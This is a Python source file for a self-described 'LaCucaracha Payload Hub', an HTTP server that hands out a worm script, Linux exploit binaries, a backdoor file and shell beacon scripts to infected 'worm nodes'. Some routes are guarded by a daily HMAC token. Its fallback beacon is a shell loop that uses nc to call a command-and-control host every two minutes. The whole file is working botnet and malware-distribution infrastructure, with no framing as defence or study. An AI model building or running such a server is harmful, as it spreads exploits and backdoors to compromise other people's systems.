#!/usr/bin/env python3
"""Payload server — serves LaCucaracha.py + exploit binaries on :10004 with daily HMAC token auth."""
import http.server
import socketserver
import hashlib
import hmac
import os
import sys
import time

KEY = b"CHANGE_ME_PAYLOAD_KEY"

EXPLOIT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "exploits")
MAIN_PAYLOAD = os.path.join(os.path.dirname(os.path.abspath(__file__)), "LaCucaracha.py")

EXPLOIT_ROUTES = {
    "copy_fail":       ("application/octet-stream", f"{EXPLOIT_DIR}/copy_fail"),
    "copy_fail.py":    ("application/octet-stream", f"{EXPLOIT_DIR}/copy_fail"),
    "dirtyfrag":       ("application/octet-stream", f"{EXPLOIT_DIR}/dirtyfrag"),
    "dirtyfrag_exp":   ("application/octet-stream", f"{EXPLOIT_DIR}/dirtyfrag"),
    "heel":            ("application/octet-stream", f"{EXPLOIT_DIR}/heel.bin"),
    "heel.latest":     ("application/octet-stream", f"{EXPLOIT_DIR}/heel.latest"),
}

BEACON_ROUTES = {
    "shell_beacon.sh":    os.path.join(os.path.dirname(os.path.abspath(__file__)), "payloads", "shell_beacon.sh"),
    "mini_beacon.sh":     os.path.join(os.path.dirname(os.path.abspath(__file__)), "payloads", "mini_beacon.sh"),
    "busybox_beacon.sh":  os.path.join(os.path.dirname(os.path.abspath(__file__)), "payloads", "busybox_beacon.sh"),
}

def _valid_token(token: str) -> bool:
    day = time.strftime("%Y-%m-%d")
    expected = hmac.new(KEY, day.encode(), hashlib.sha256).hexdigest()[:16]
    return token == expected

def _daily_token() -> str:
    day = time.strftime("%Y-%m-%d")
    return hmac.new(KEY, day.encode(), hashlib.sha256).hexdigest()[:16]

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        # Split path from query string
        path = self.path.split("?", 1)[0].strip("/")
        token = ""
        if "?" in self.path:
            qs = self.path.split("?", 1)[1]
            for part in qs.split("&"):
                if part.startswith("token="):
                    token = part.split("=", 1)[1]
                    break

        # Busybox routes — no token required
        if path.startswith("busybox/"):
            sub = path.split("busybox/", 1)[1]
            self._serve_beacon(sub)
            return

        # Main payload routes — token exempt (internal download for worm nodes)
        if path in ("LaCucaracha.py", "LaCucaracha", "worm",
                     "la_cucaracha.py", "la_cucaracha"):
            self._serve_file(MAIN_PAYLOAD, "text/x-python", f"LaCucaracha.py")
            return

        # ZZZ backdoor — token exempt
        if path in ("zzz_backdoor.py", "zzz_backdoor"):
            self._serve_file("/opt/hermes/zzz_backdoor.py", "text/x-python", "zzz_backdoor.py")
            return

        # Token validation for exploit binaries and beacon routes
        if not _valid_token(token):
            self.send_response(403)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"invalid token")
            return

        if path in EXPLOIT_ROUTES:
            ct, fpath = EXPLOIT_ROUTES[path]
            self._serve_file(fpath, ct, os.path.basename(fpath))
        elif path in BEACON_ROUTES:
            self._serve_beacon(path)
        elif path in ("", "status"):
            self._serve_status()
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 - Not Found\n")

    def _serve_file(self, filepath: str, content_type: str, filename: str):
        try:
            with open(filepath, "rb") as f:
                data = f.read()
            self.send_response(200)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(data)))
            self.send_header("Content-Disposition", f'attachment; filename="{filename}"')
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(data)
        except FileNotFoundError:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"File not found\n")

    def _serve_beacon(self, path: str):
        fpath = BEACON_ROUTES.get(path)
        if fpath and os.path.exists(fpath):
            self.send_response(200)
            self.send_header("Content-Type", "text/x-shellscript")
            self.end_headers()
            with open(fpath, "rb") as f:
                self.wfile.write(f.read())
        elif path in ("shell_beacon.sh", "mini_beacon.sh", "busybox_beacon.sh"):
            # Fallback inline beacon
            self.send_response(200)
            self.send_header("Content-Type", "text/x-shellscript")
            self.end_headers()
            beacon = (
                '#!/bin/sh\n'
                'C2_HOST="127.0.0.1"\n'
                'C2_PORT=10001\n'
                'while true; do\n'
                f'  (echo "sh3ll_4cc3ss_b0rg_2026 worm-{path.replace(".sh","")}"; sleep 10) | nc $C2_HOST $C2_PORT 2>/dev/null &\n'
                '  sleep 120\n'
                'done\n'
            )
            self.wfile.write(beacon.encode())
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Busybox payload not found\n")

    def _serve_status(self):
        available = []
        for route, (_, fpath) in EXPLOIT_ROUTES.items():
            if route in ("copy_fail.py", "dirtyfrag_exp"):
                continue  # aliases — skip dupes
            if os.path.exists(fpath):
                available.append(route)
        for f in ["LaCucaracha.py", "worm_mesh_engine.py", "zzz_backdoor.py"]:
            p = f"/opt/hermes/{f}"
            if os.path.exists(p):
                available.append(f)
        for b in BEACON_ROUTES:
            p = BEACON_ROUTES[b]
            if os.path.exists(p):
                available.append(b)

        status = {
            "service": "LaCucaracha Payload Hub",
            "version": "BotnetInquisitor/v2",
            "port": 10004,
            "token_protected": True,
            "files_available": sorted(set(available)),
        }
        body = __import__("json").dumps(status, indent=2).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        # Log: timestamp remote_ip route status bytes
        path = self.path.split("?")[0] if hasattr(self, "path") else "?"
        status = getattr(self, "command", "?")
        sys.stderr.write(f"[{time.strftime('%H:%M:%S')}] {self.client_address[0]} GET {path} -> {args[0] if args else '?'}\n")
        sys.stderr.flush()

if __name__ == "__main__":
    socketserver.TCPServer.allow_reuse_address = True
    server = socketserver.TCPServer(("0.0.0.0", 10004), Handler)
    print(f"🚀 Payload Hub serving on :10004")
    print(f"   Routes: LaCucaracha.py, {', '.join(EXPLOIT_ROUTES.keys())}")
    server.serve_forever()
